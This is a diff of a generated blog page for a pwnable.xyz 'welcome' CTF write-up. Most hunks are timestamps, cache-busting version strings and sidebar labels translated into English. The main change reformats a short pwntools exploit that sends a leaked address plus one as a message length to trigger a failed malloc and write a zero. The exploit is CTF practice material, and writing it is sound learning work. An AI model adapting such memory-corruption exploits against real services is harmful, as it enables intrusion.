@@ -21,7 +21,7 @@
 <meta property="og:image" content="http://i1.fuimg.com/696456/119eebdc5119a96f.png">
 <meta property="og:image" content="http://i1.fuimg.com/696456/12e8d4e4025934aa.png">
 <meta property="og:image" content="http://i1.fuimg.com/696456/186e0c53b922e2b4.png">
-<meta property="og:updated_time" content="2019-08-07T11:56:07.732Z">
+<meta property="og:updated_time" content="2019-08-07T12:25:30.771Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="pwnable.xyz welcome WriteUp">
 <meta name="twitter:description" content="开始做pwnable.xyz上的题目了，记录下做题的思路。">
@@ -32,7 +32,7 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1565179095718">
+  <link rel="stylesheet" href="/css/style.css?v=1565181817817">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -46,9 +46,9 @@
         </a>
     </div>
     <div class="nexmoe-count">
-        <div><span>文章</span>2</div>
-        <div><span>标签</span>2</div>
-        <div><span>分类</span>0</div>
+        <div><span>Articles</span>2</div>
+        <div><span>Tags</span>2</div>
+        <div><span>Categories</span>0</div>
     </div>
     <ul class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
         
@@ -92,7 +92,7 @@
   
   
   <div class="nexmoe-widget-wrap">
-    <h3 class="nexmoe-widget-title">标签云</h3>
+    <h3 class="nexmoe-widget-title">Tag Cloud</h3>
     <div class="nexmoe-widget tagcloud">
       <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/pwn/" style="font-size: 10px;">pwn</a>
     </div>
@@ -166,7 +166,7 @@
     </div>
   <div class="nexmoe-post-meta">
     <a><i class="nexmoefont icon-calendar-fill"></i>2019年08月07日</a>
-    <a><i class="nexmoefont icon-areachart"></i>215 字</a>
+    <a><i class="nexmoefont icon-areachart"></i>222 字</a>
     <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
     
     
@@ -193,11 +193,18 @@
 </li>
 </ol>
 <p>因此当我们使得<code>malloc()</code>函数分配空间失败时，v5 == 0 ，就可以实现对<code>hex(size-1)</code>地址的赋值为0操作，即可获得flag。  </p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2>   <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = remote(<span class="string">"svc.pwnable.xyz"</span>,<span class="number">30000</span>)</span><br><span class="line">sh.recvuntil(<span class="string">"Leak:"</span>)</span><br><span class="line">leak = sh.recvline()</span><br><span class="line"><span class="comment">#print(leak)</span></span><br><span class="line">payload = str(int(leak,<span class="number">16</span>) + <span class="number">1</span>)</span><br><span class="line"><span class="comment">#print(payload)</span></span><br><span class="line">sh.recvuntil(<span class="string">"Length of your message: "</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">" "</span>)</span><br><span class="line">print(sh.recv())</span><br></pre></td></tr></table></figure>
-
-
-
-
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>from pwn import *
+sh = remote(&quot;svc.pwnable.xyz&quot;,30000)
+sh.recvuntil(&quot;Leak:&quot;)
+leak = sh.recvline()
+#print(leak)
+payload = str(int(leak,16) + 1)
+#print(payload)
+sh.recvuntil(&quot;Length of your message: &quot;)
+sh.sendline(payload)
+sh.recv()
+sh.sendline(&quot; &quot;)
+print(sh.recv())</code></pre>
   </article>
   <section class="nexmoe-comment">
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.5.0/dist/gitalk.min.css">
@@ -231,7 +238,7 @@
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/js/app.js?v=1565179095713"></script>
+<script src="/js/app.js?v=1565181817829"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
 
   
